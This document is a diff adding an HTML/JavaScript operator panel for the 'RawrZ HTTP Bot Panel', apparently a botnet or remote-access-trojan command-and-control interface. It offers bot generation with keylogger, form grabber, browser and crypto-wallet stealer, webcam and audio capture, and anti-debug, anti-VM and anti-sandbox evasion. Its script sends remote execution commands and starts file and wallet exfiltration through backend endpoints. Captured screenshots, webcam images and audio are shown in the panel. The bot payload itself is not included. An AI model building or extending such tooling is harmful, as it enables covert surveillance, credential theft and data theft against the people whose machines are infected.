@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RawrZ HTTP Bot Panel - Advanced Bot Management</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0c0f1a 0%, #1a1f2e 100%);
+            color: #e6e9ef; 
+            min-height: 100vh;
+        }
+        .header {
+            background: linear-gradient(90deg, #1a1f2e 0%, #2d3748 100%);
+            padding: 1rem 2rem; 
+            border-bottom: 2px solid #4a5568;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .header h1 {
+            color: #68d391; 
+            font-size: 1.8rem; 
+            font-weight: 600;
+            text-shadow: 0 0 10px rgba(104, 211, 145, 0.3);
+        }
+        .header .subtitle { 
+            color: #a0aec0; 
+            font-size: 0.9rem; 
+            margin-top: 0.25rem;
+        }
+        .container { 
+            max-width: 1400px; 
+            margin: 0 auto; 
+            padding: 2rem; 
+        }
+        .grid { 
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); 
+            gap: 1.5rem; 
+            margin-bottom: 2rem;
+        }
+        .card { 
+            background: linear-gradient(145deg, #1a202c 0%, #2d3748 100%);
+            border: 1px solid #4a5568; 
+            border-radius: 12px; 
+            padding: 1.5rem; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .card:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+        }
+        .card h3 { 
+            color: #68d391; 
+            margin-bottom: 1rem; 
+            font-size: 1.2rem;
+            border-bottom: 1px solid #4a5568;
+            padding-bottom: 0.5rem;
+        }
+        .form-group { 
+            margin-bottom: 1rem; 
+        }
+        .form-group label { 
+            display: block; 
+            margin-bottom: 0.5rem; 
+            color: #e2e8f0; 
+            font-weight: 500;
+        }
+        .form-group input, .form-group select, .form-group textarea { 
+            width: 100%; 
+            padding: 0.75rem; 
+            border: 1px solid #4a5568; 
+            border-radius: 6px; 
+            background: #2d3748; 
+            color: #e2e8f0; 
+            font-size: 0.9rem;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus { 
+            outline: none; 
+            border-color: #68d391; 
+            box-shadow: 0 0 0 3px rgba(104, 211, 145, 0.1);
+        }
+        .btn { 
+            background: linear-gradient(135deg, #68d391 0%, #48bb78 100%); 
+            color: #1a202c; 
+            border: none; 
+            padding: 0.75rem 1.5rem; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-weight: 600; 
+            font-size: 0.9rem;
+            transition: all 0.2s;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+        .btn:hover { 
+            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%); 
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(104, 211, 145, 0.3);
+        }
+        .btn-danger { 
+            background: linear-gradient(135deg, #f56565 0%, #e53e3e 100%); 
+        }
+        .btn-danger:hover { 
+            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%); 
+        }
+        .btn-warning { 
+            background: linear-gradient(135deg, #ed8936 0%, #dd6b20 100%); 
+        }
+        .btn-warning:hover { 
+            background: linear-gradient(135deg, #dd6b20 0%, #c05621 100%); 
+        }
+        .status-indicator { 
+            display: inline-block; 
+            width: 8px; 
+            height: 8px; 
+            border-radius: 50%; 
+            margin-right: 0.5rem; 
+        }
+        .status-online { background: #68d391; }
+        .status-offline { background: #f56565; }
+        .status-connecting { background: #ed8936; }
+        .bot-list { 
+            max-height: 400px; 
+            overflow-y: auto; 
+            border: 1px solid #4a5568; 
+            border-radius: 6px; 
+            padding: 1rem; 
+            background: #1a202c;
+        }
+        .bot-item { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 0.75rem; 
+            border-bottom: 1px solid #4a5568; 
+            transition: background 0.2s;
+        }
+        .bot-item:hover { 
+            background: #2d3748; 
+        }
+        .bot-info { 
+            flex: 1; 
+        }
+        .bot-name { 
+            font-weight: 600; 
+            color: #68d391; 
+        }
+        .bot-details { 
+            font-size: 0.8rem; 
+            color: #a0aec0; 
+            margin-top: 0.25rem;
+        }
+        .bot-actions { 
+            display: flex; 
+            gap: 0.5rem; 
+        }
+        .log-container { 
+            background: #1a202c; 
+            border: 1px solid #4a5568; 
+            border-radius: 6px; 
+            padding: 1rem; 
+            height: 300px; 
+            overflow-y: auto; 
+            font-family: 'Courier New', monospace; 
+            font-size: 0.8rem;
+        }
+        .log-entry { 
+            margin-bottom: 0.5rem; 
+            padding: 0.25rem; 
+            border-radius: 3px;
+        }
+        .log-info { color: #68d391; }
+        .log-warning { color: #ed8936; }
+        .log-error { color: #f56565; }
+        .log-success { color: #48bb78; }
+        .feature-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
+            gap: 1rem; 
+            margin-top: 1rem;
+        }
+        .feature-item { 
+            display: flex; 
+            align-items: center; 
+            padding: 0.5rem; 
+            background: #2d3748; 
+            border-radius: 6px; 
+            border: 1px solid #4a5568;
+        }
+        .feature-item input[type="checkbox"] { 
+            margin-right: 0.5rem; 
+            width: auto;
+        }
+        .slider-container { 
+            margin: 1rem 0; 
+        }
+        .slider { 
+            width: 100%; 
+            height: 6px; 
+            border-radius: 3px; 
+            background: #4a5568; 
+            outline: none; 
+            -webkit-appearance: none;
+        }
+        .slider::-webkit-slider-thumb { 
+            -webkit-appearance: none; 
+            appearance: none; 
+            width: 20px; 
+            height: 20px; 
+            border-radius: 50%; 
+            background: #68d391; 
+            cursor: pointer;
+        }
+        .slider::-moz-range-thumb { 
+            width: 20px; 
+            height: 20px; 
+            border-radius: 50%; 
+            background: #68d391; 
+            cursor: pointer; 
+            border: none;
+        }
+        .slider-value { 
+            text-align: center; 
+            margin-top: 0.5rem; 
+            color: #68d391; 
+            font-weight: 600;
+        }
+        .toggle-switch { 
+            position: relative; 
+            display: inline-block; 
+            width: 60px; 
+            height: 34px;
+        }
+        .toggle-switch input { 
+            opacity: 0; 
+            width: 0; 
+            height: 0;
+        }
+        .slider-toggle { 
+            position: absolute; 
+            cursor: pointer; 
+            top: 0; 
+            left: 0; 
+            right: 0; 
+            bottom: 0; 
+            background-color: #4a5568; 
+            transition: .4s; 
+            border-radius: 34px;
+        }
+        .slider-toggle:before { 
+            position: absolute; 
+            content: ""; 
+            height: 26px; 
+            width: 26px; 
+            left: 4px; 
+            bottom: 4px; 
+            background-color: white; 
+            transition: .4s; 
+            border-radius: 50%;
+        }
+        input:checked + .slider-toggle { 
+            background-color: #68d391;
+        }
+        input:checked + .slider-toggle:before { 
+            transform: translateX(26px);
+        }
+        .stats-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); 
+            gap: 1rem; 
+            margin-bottom: 2rem;
+        }
+        .stat-card { 
+            background: linear-gradient(145deg, #1a202c 0%, #2d3748 100%);
+            border: 1px solid #4a5568; 
+            border-radius: 8px; 
+            padding: 1rem; 
+            text-align: center;
+        }
+        .stat-number { 
+            font-size: 2rem; 
+            font-weight: 700; 
+            color: #68d391; 
+        }
+        .stat-label { 
+            font-size: 0.8rem; 
+            color: #a0aec0; 
+            margin-top: 0.25rem;
+        }
+        .alert { 
+            padding: 1rem; 
+            border-radius: 6px; 
+            margin-bottom: 1rem; 
+            border-left: 4px solid;
+        }
+        .alert-success { 
+            background: rgba(104, 211, 145, 0.1); 
+            border-color: #68d391; 
+            color: #68d391;
+        }
+        .alert-warning { 
+            background: rgba(237, 137, 54, 0.1); 
+            border-color: #ed8936; 
+            color: #ed8936;
+        }
+        .alert-error { 
+            background: rgba(245, 101, 101, 0.1); 
+            border-color: #f56565; 
+            color: #f56565;
+        }
+        .hidden { display: none; }
+        .loading { 
+            opacity: 0.6; 
+            pointer-events: none; 
+        }
+        .spinner { 
+            border: 2px solid #4a5568; 
+            border-top: 2px solid #68d391; 
+            border-radius: 50%; 
+            width: 20px; 
+            height: 20px; 
+            animation: spin 1s linear infinite; 
+            display: inline-block; 
+            margin-right: 0.5rem;
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>RawrZ HTTP Bot Panel</h1>
+        <div class="subtitle">Advanced HTTP Bot Management & Control Interface</div>
+    </div>
+
+    <div class="container">
+        <!-- Statistics Dashboard -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="totalBots">0</div>
+                <div class="stat-label">Total Bots</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activeBots">0</div>
+                <div class="stat-label">Active Bots</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalConnections">0</div>
+                <div class="stat-label">Connections</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="dataTransferred">0 MB</div>
+                <div class="stat-label">Data Transferred</div>
+            </div>
+        </div>
+
+        <div class="grid">
+            <!-- Bot Generation -->
+            <div class="card">
+                <h3>HTTP Bot Generation</h3>
+                <div class="form-group">
+                    <label>Bot Name</label>
+                    <input type="text" id="botName" placeholder="Enter bot name" value="RawrZBot">
+                </div>
+                <div class="form-group">
+                    <label>Target Platform</label>
+                    <select id="targetPlatform">
+                        <option value="windows">Windows</option>
+                        <option value="linux">Linux</option>
+                        <option value="macos">macOS</option>
+                        <option value="android">Android</option>
+                        <option value="ios">iOS</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Programming Language</label>
+                    <select id="botLanguage">
+                        <option value="cpp">C++</option>
+                        <option value="python">Python</option>
+                        <option value="javascript">JavaScript</option>
+                        <option value="go">Go</option>
+                        <option value="rust">Rust</option>
+                        <option value="csharp">C#</option>
+                        <option value="swift">Swift</option>
+                        <option value="kotlin">Kotlin</option>
+                        <option value="java">Java</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Server URL</label>
+                    <input type="text" id="serverUrl" placeholder="http://your-server.com" value="http://localhost:8080">
+                </div>
+                <div class="form-group">
+                    <label>Connection Interval (seconds)</label>
+                    <input type="number" id="connectionInterval" value="30" min="5" max="3600">
+                </div>
+                <button class="btn" onclick="generateBot()">Generate HTTP Bot</button>
+                <button class="btn btn-warning" onclick="testBot()">Test Bot</button>
+            </div>
+
+            <!-- Bot Features -->
+            <div class="card">
+                <h3>Bot Features</h3>
+                <div class="feature-grid">
+                    <div class="feature-item">
+                        <input type="checkbox" id="fileManager" checked>
+                        <label for="fileManager">File Manager</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="processManager" checked>
+                        <label for="processManager">Process Manager</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="systemInfo" checked>
+                        <label for="systemInfo">System Info</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="networkTools" checked>
+                        <label for="networkTools">Network Tools</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="keylogger">
+                        <label for="keylogger">Keylogger</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="screenCapture">
+                        <label for="screenCapture">Screen Capture</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="formGrabber">
+                        <label for="formGrabber">Form Grabber</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="webcamCapture">
+                        <label for="webcamCapture">Webcam Capture</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="audioCapture">
+                        <label for="audioCapture">Audio Capture</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="browserStealer">
+                        <label for="browserStealer">Browser Stealer</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="cryptoStealer">
+                        <label for="cryptoStealer">Crypto Stealer</label>
+                    </div>
+                    <div class="feature-item">
+                        <input type="checkbox" id="dataExfiltration" checked>
+                        <label for="dataExfiltration">Data Exfiltration</label>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Advanced Options -->
+            <div class="card">
+                <h3>Advanced Options</h3>
+                <div class="form-group">
+                    <label>Stealth Level</label>
+                    <div class="slider-container">
+                        <input type="range" class="slider" id="stealthLevel" min="0" max="3" value="2">
+                        <div class="slider-value" id="stealthValue">High</div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Obfuscation Level</label>
+                    <div class="slider-container">
+                        <input type="range" class="slider" id="obfuscationLevel" min="0" max="4" value="2">
+                        <div class="slider-value" id="obfuscationValue">Intermediate</div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Anti-Detection Features</label>
+                    <div class="feature-grid">
+                        <div class="feature-item">
+                            <input type="checkbox" id="antiDebug" checked>
+                            <label for="antiDebug">Anti-Debug</label>
+                        </div>
+                        <div class="feature-item">
+                            <input type="checkbox" id="antiVM" checked>
+                            <label for="antiVM">Anti-VM</label>
+                        </div>
+                        <div class="feature-item">
+                            <input type="checkbox" id="antiSandbox" checked>
+                            <label for="antiSandbox">Anti-Sandbox</label>
+                        </div>
+                        <div class="feature-item">
+                            <input type="checkbox" id="memoryProtection">
+                            <label for="memoryProtection">Memory Protection</label>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Encryption Method</label>
+                    <select id="encryptionMethod">
+                        <option value="aes256">AES-256</option>
+                        <option value="chacha20">ChaCha20</option>
+                        <option value="camellia256">Camellia-256</option>
+                        <option value="aria256">ARIA-256</option>
+                        <option value="custom">Custom</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Bot Management -->
+            <div class="card">
+                <h3>Active Bots</h3>
+                <div class="bot-list" id="botList">
+                    <div class="bot-item">
+                        <div class="bot-info">
+                            <div class="bot-name">
+                                <span class="status-indicator status-online"></span>
+                                RawrZBot-001
+                            </div>
+                            <div class="bot-details">Windows | C++ | 192.168.1.100</div>
+                        </div>
+                        <div class="bot-actions">
+                            <button class="btn" onclick="controlBot('RawrZBot-001', 'connect')">Connect</button>
+                            <button class="btn btn-warning" onclick="controlBot('RawrZBot-001', 'pause')">Pause</button>
+                            <button class="btn btn-danger" onclick="controlBot('RawrZBot-001', 'disconnect')">Disconnect</button>
+                        </div>
+                    </div>
+                </div>
+                <button class="btn" onclick="refreshBots()">Refresh Bots</button>
+                <button class="btn btn-danger" onclick="disconnectAllBots()">Disconnect All</button>
+            </div>
+
+            <!-- Bot Communication -->
+            <div class="card">
+                <h3>Bot Communication</h3>
+                <div class="form-group">
+                    <label>Select Bot</label>
+                    <select id="selectedBot">
+                        <option value="">Select a bot...</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Command</label>
+                    <select id="botCommand">
+                        <option value="info">Get System Info</option>
+                        <option value="files">List Files</option>
+                        <option value="processes">List Processes</option>
+                        <option value="screenshot">Take Screenshot</option>
+                        <option value="keylog">Start Keylogger</option>
+                        <option value="download">Download File</option>
+                        <option value="upload">Upload File</option>
+                        <option value="execute">Execute Command</option>
+                        <option value="webcam">Webcam Capture</option>
+                        <option value="audio">Audio Capture</option>
+                        <option value="browser">Browser Data</option>
+                        <option value="crypto">Crypto Wallets</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Parameters (optional)</label>
+                    <input type="text" id="commandParams" placeholder="Command parameters...">
+                </div>
+                <button class="btn" onclick="sendCommand()">Send Command</button>
+                <button class="btn btn-warning" onclick="clearLogs()">Clear Logs</button>
+            </div>
+
+            <!-- Activity Logs -->
+            <div class="card">
+                <h3>Activity Logs</h3>
+                <div class="log-container" id="logContainer">
+                    <div class="log-entry log-info">[INFO] HTTP Bot Panel initialized</div>
+                    <div class="log-entry log-success">[SUCCESS] Bot RawrZBot-001 connected</div>
+                    <div class="log-entry log-warning">[WARNING] Bot RawrZBot-002 connection timeout</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Data Exfiltration -->
+        <div class="card">
+            <h3>Data Exfiltration</h3>
+            <div class="grid">
+                <div class="form-group">
+                    <label>Exfiltration Type</label>
+                    <select id="exfilType">
+                        <option value="files">Files</option>
+                        <option value="browser">Browser Data</option>
+                        <option value="crypto">Crypto Wallets</option>
+                        <option value="documents">Documents</option>
+                        <option value="images">Images</option>
+                        <option value="videos">Videos</option>
+                        <option value="audio">Audio Files</option>
+                        <option value="database">Database Files</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Target Path</label>
+                    <input type="text" id="exfilPath" placeholder="C:\Users\%USERNAME%\Documents">
+                </div>
+                <div class="form-group">
+                    <label>File Extensions</label>
+                    <input type="text" id="exfilExtensions" placeholder=".txt,.doc,.pdf,.jpg,.png">
+                </div>
+                <div class="form-group">
+                    <label>Max File Size (MB)</label>
+                    <input type="number" id="maxFileSize" value="10" min="1" max="100">
+                </div>
+            </div>
+            <button class="btn" onclick="startExfiltration()">Start Exfiltration</button>
+            <button class="btn btn-warning" onclick="stopExfiltration()">Stop Exfiltration</button>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let bots = [];
+        let logs = [];
+        let isExfiltrating = false;
+
+        // Initialize panel
+        document.addEventListener('DOMContentLoaded', function() {
+            initializePanel();
+            setupEventListeners();
+            startStatusUpdates();
+        });
+
+        function initializePanel() {
+            updateStats();
+            refreshBots();
+            addLog('info', 'HTTP Bot Panel initialized');
+        }
+
+        function setupEventListeners() {
+            // Slider value updates
+            document.getElementById('stealthLevel').addEventListener('input', function() {
+                const values = ['None', 'Low', 'High', 'Maximum'];
+                document.getElementById('stealthValue').textContent = values[this.value];
+            });
+
+            document.getElementById('obfuscationLevel').addEventListener('input', function() {
+                const values = ['None', 'Basic', 'Intermediate', 'Advanced', 'Extreme'];
+                document.getElementById('obfuscationValue').textContent = values[this.value];
+            });
+        }
+
+        async function generateBot() {
+            const config = {
+                name: document.getElementById('botName').value,
+                platform: document.getElementById('targetPlatform').value,
+                language: document.getElementById('botLanguage').value,
+                serverUrl: document.getElementById('serverUrl').value,
+                connectionInterval: parseInt(document.getElementById('connectionInterval').value)
+            };
+
+            const features = getSelectedFeatures();
+            const extensions = [config.language];
+
+            try {
+                addLog('info', 'Generating HTTP bot...');
+                const response = await fetch('/http-bot/generate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ config, features, extensions })
+                });
+
+                const result = await response.json();
+                if (result.success) {
+                    addLog('success', `Bot generated successfully: ${result.result.botId}`);
+                    updateStats();
+                } else {
+                    addLog('error', `Bot generation failed: ${result.error}`);
+                }
+            } catch (error) {
+                addLog('error', `Error generating bot: ${error.message}`);
+            }
+        }
+
+        async function testBot() {
+            const config = {
+                name: document.getElementById('botName').value,
+                platform: document.getElementById('targetPlatform').value,
+                language: document.getElementById('botLanguage').value,
+                serverUrl: document.getElementById('serverUrl').value
+            };
+
+            try {
+                addLog('info', 'Testing bot configuration...');
+                const response = await fetch('/http-bot/test', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ config })
+                });
+
+                const result = await response.json();
+                if (result.success) {
+                    addLog('success', 'Bot test completed successfully');
+                } else {
+                    addLog('error', `Bot test failed: ${result.error}`);
+                }
+            } catch (error) {
+                addLog('error', `Error testing bot: ${error.message}`);
+            }
+        }
+
+        function getSelectedFeatures() {
+            const features = [];
+            const checkboxes = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
+            checkboxes.forEach(checkbox => {
+                features.push(checkbox.id);
+            });
+            return features;
+        }
+
+        async function refreshBots() {
+            try {
+                const response = await fetch('/http-bot/status');
+                const result = await response.json();
+                
+                if (result.success) {
+                    bots = result.result || [];
+                    updateBotList();
+                    updateBotSelect();
+                    updateStats();
+                }
+            } catch (error) {
+                addLog('error', `Error refreshing bots: ${error.message}`);
+            }
+        }
+
+        function updateBotList() {
+            const botList = document.getElementById('botList');
+            botList.innerHTML = '';
+
+            bots.forEach(bot => {
+                const botItem = document.createElement('div');
+                botItem.className = 'bot-item';
+                botItem.innerHTML = `
+                    <div class="bot-info">
+                        <div class="bot-name">
+                            <span class="status-indicator status-${bot.status}"></span>
+                            ${bot.name}
+                        </div>
+                        <div class="bot-details">${bot.platform} | ${bot.language} | ${bot.ip || 'Unknown'}</div>
+                    </div>
+                    <div class="bot-actions">
+                        <button class="btn" onclick="controlBot('${bot.id}', 'connect')">Connect</button>
+                        <button class="btn btn-warning" onclick="controlBot('${bot.id}', 'pause')">Pause</button>
+                        <button class="btn btn-danger" onclick="controlBot('${bot.id}', 'disconnect')">Disconnect</button>
+                    </div>
+                `;
+                botList.appendChild(botItem);
+            });
+        }
+
+        function updateBotSelect() {
+            const select = document.getElementById('selectedBot');
+            select.innerHTML = '<option value="">Select a bot...</option>';
+            
+            bots.forEach(bot => {
+                const option = document.createElement('option');
+                option.value = bot.id;
+                option.textContent = `${bot.name} (${bot.status})`;
+                select.appendChild(option);
+            });
+        }
+
+        async function controlBot(botId, action) {
+            try {
+                addLog('info', `Sending ${action} command to bot ${botId}`);
+                
+                let endpoint, body;
+                if (action === 'connect') {
+                    endpoint = '/http-bot/connect';
+                    body = { botId, serverUrl: document.getElementById('serverUrl').value };
+                } else if (action === 'disconnect') {
+                    endpoint = '/http-bot/disconnect';
+                    body = { botId };
+                } else if (action === 'pause') {
+                    endpoint = '/http-bot/command';
+                    body = { botId, command: 'pause' };
+                }
+                
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    addLog('success', `Command ${action} sent to bot ${botId}`);
+                    refreshBots();
+                } else {
+                    addLog('error', `Command ${action} failed: ${result.error}`);
+                }
+            } catch (error) {
+                addLog('error', `Error controlling bot: ${error.message}`);
+            }
+        }
+
+        async function sendCommand() {
+            const botId = document.getElementById('selectedBot').value;
+            const command = document.getElementById('botCommand').value;
+            const params = document.getElementById('commandParams').value;
+
+            if (!botId) {
+                addLog('warning', 'Please select a bot first');
+                return;
+            }
+
+            try {
+                addLog('info', `Sending command ${command} to bot ${botId}`);
+                
+                const response = await fetch('/http-bot/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ botId, command, params })
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    addLog('success', `Command ${command} executed successfully`);
+                    
+                    // Handle specific command responses
+                    if (command === 'screenshot') {
+                        handleScreenshotResponse(result.result);
+                    } else if (command === 'webcam') {
+                        handleWebcamResponse(result.result);
+                    } else if (command === 'audio') {
+                        handleAudioResponse(result.result);
+                    }
+                } else {
+                    addLog('error', `Command ${command} failed: ${result.error}`);
+                }
+            } catch (error) {
+                addLog('error', `Error sending command: ${error.message}`);
+            }
+        }
+
+        async function startExfiltration() {
+            const type = document.getElementById('exfilType').value;
+            const path = document.getElementById('exfilPath').value;
+            const extensions = document.getElementById('exfilExtensions').value;
+            const maxSize = document.getElementById('maxFileSize').value;
+            const botId = document.getElementById('selectedBot').value;
+
+            if (!botId) {
+                addLog('warning', 'Please select a bot first');
+                return;
+            }
+
+            try {
+                addLog('info', `Starting ${type} exfiltration from ${path}`);
+                
+                const response = await fetch('/http-bot/exfiltrate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ botId, type, path, extensions, maxSize })
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    isExfiltrating = true;
+                    addLog('success', 'Data exfiltration started');
+                } else {
+                    addLog('error', `Exfiltration failed: ${result.error}`);
+                }
+            } catch (error) {
+                addLog('error', `Error starting exfiltration: ${error.message}`);
+            }
+        }
+
+        function stopExfiltration() {
+            isExfiltrating = false;
+            addLog('warning', 'Data exfiltration stopped');
+        }
+
+        function disconnectAllBots() {
+            bots.forEach(bot => {
+                controlBot(bot.id, 'disconnect');
+            });
+            addLog('warning', 'Disconnect command sent to all bots');
+        }
+
+        function updateStats() {
+            document.getElementById('totalBots').textContent = bots.length;
+            document.getElementById('activeBots').textContent = bots.filter(b => b.status === 'online').length;
+            document.getElementById('totalConnections').textContent = bots.reduce((sum, b) => sum + (b.connections || 0), 0);
+            document.getElementById('dataTransferred').textContent = bots.reduce((sum, b) => sum + (b.dataTransferred || 0), 0) + ' MB';
+        }
+
+        function addLog(type, message) {
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            logEntry.textContent = `[${timestamp}] [${type.toUpperCase()}] ${message}`;
+            
+            const logContainer = document.getElementById('logContainer');
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        function clearLogs() {
+            document.getElementById('logContainer').innerHTML = '';
+            addLog('info', 'Logs cleared');
+        }
+
+        function startStatusUpdates() {
+            setInterval(() => {
+                refreshBots();
+            }, 30000); // Update every 30 seconds
+        }
+
+        // Response handlers for different command types
+        function handleScreenshotResponse(result) {
+            if (result.data) {
+                const img = document.createElement('img');
+                img.src = `data:image/png;base64,${result.data}`;
+                img.style.maxWidth = '100%';
+                img.style.border = '1px solid #4a5568';
+                img.style.borderRadius = '6px';
+                img.style.marginTop = '1rem';
+                
+                const logContainer = document.getElementById('logContainer');
+                const screenshotDiv = document.createElement('div');
+                screenshotDiv.className = 'log-entry log-success';
+                screenshotDiv.innerHTML = `[SCREENSHOT] Captured from bot ${result.botId}`;
+                screenshotDiv.appendChild(img);
+                logContainer.appendChild(screenshotDiv);
+                logContainer.scrollTop = logContainer.scrollHeight;
+            }
+        }
+
+        function handleWebcamResponse(result) {
+            if (result.data) {
+                const img = document.createElement('img');
+                img.src = `data:image/jpeg;base64,${result.data}`;
+                img.style.maxWidth = '100%';
+                img.style.border = '1px solid #4a5568';
+                img.style.borderRadius = '6px';
+                img.style.marginTop = '1rem';
+                
+                const logContainer = document.getElementById('logContainer');
+                const webcamDiv = document.createElement('div');
+                webcamDiv.className = 'log-entry log-success';
+                webcamDiv.innerHTML = `[WEBCAM] Captured from bot ${result.botId}`;
+                webcamDiv.appendChild(img);
+                logContainer.appendChild(webcamDiv);
+                logContainer.scrollTop = logContainer.scrollHeight;
+            }
+        }
+
+        function handleAudioResponse(result) {
+            if (result.data) {
+                const audio = document.createElement('audio');
+                audio.controls = true;
+                audio.src = `data:audio/wav;base64,${result.data}`;
+                audio.style.width = '100%';
+                audio.style.marginTop = '1rem';
+                
+                const logContainer = document.getElementById('logContainer');
+                const audioDiv = document.createElement('div');
+                audioDiv.className = 'log-entry log-success';
+                audioDiv.innerHTML = `[AUDIO] Captured from bot ${result.botId}`;
+                audioDiv.appendChild(audio);
+                logContainer.appendChild(audioDiv);
+                logContainer.scrollTop = logContainer.scrollHeight;
+            }
+        }
+
+        // Additional utility functions
+        async function getBotData(botId, dataType) {
+            try {
+                const response = await fetch(`/http-bot/${dataType}/${botId}`);
+                const result = await response.json();
+                
+                if (result.success) {
+                    addLog('info', `Retrieved ${dataType} data from bot ${botId}`);
+                    return result.data || result[dataType];
+                } else {
+                    addLog('error', `Failed to get ${dataType} data: ${result.error}`);
+                }
+            } catch (error) {
+                addLog('error', `Error getting ${dataType} data: ${error.message}`);
+            }
+        }
+
+        async function downloadFile(botId, filepath) {
+            try {
+                const response = await fetch(`/http-bot/download/${botId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ filepath })
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    addLog('success', `File downloaded: ${filepath}`);
+                } else {
+                    addLog('error', `Download failed: ${result.error}`);
+                }
+            } catch (error) {
+                addLog('error', `Error downloading file: ${error.message}`);
+            }
+        }
+
+        async function uploadFile(botId, filepath, data) {
+            try {
+                const response = await fetch(`/http-bot/upload/${botId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ filepath, data })
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    addLog('success', `File uploaded: ${filepath}`);
+                } else {
+                    addLog('error', `Upload failed: ${result.error}`);
+                }
+            } catch (error) {
+                addLog('error', `Error uploading file: ${error.message}`);
+            }
+        }
+
+        // Enhanced bot management functions
+        async function getBotSystemInfo(botId) {
+            const info = await getBotData(botId, 'system-info');
+            if (info) {
+                addLog('info', `System Info for ${botId}: ${JSON.stringify(info, null, 2)}`);
+            }
+        }
+
+        async function getBotProcesses(botId) {
+            const processes = await getBotData(botId, 'processes');
+            if (processes) {
+                addLog('info', `Processes for ${botId}: ${processes.length} running`);
+            }
+        }
+
+        async function getBotFiles(botId, path = '') {
+            const files = await getBotData(botId, 'files');
+            if (files) {
+                addLog('info', `Files for ${botId}: ${files.length} found`);
+            }
+        }
+
+        async function getBrowserData(botId) {
+            const data = await getBotData(botId, 'browser-data');
+            if (data) {
+                addLog('info', `Browser data for ${botId}: ${JSON.stringify(data, null, 2)}`);
+            }
+        }
+
+        async function getCryptoWallets(botId) {
+            const wallets = await getBotData(botId, 'crypto-wallets');
+            if (wallets) {
+                addLog('info', `Crypto wallets for ${botId}: ${JSON.stringify(wallets, null, 2)}`);
+            }
+        }
+    </script>
+</body>
+</html>
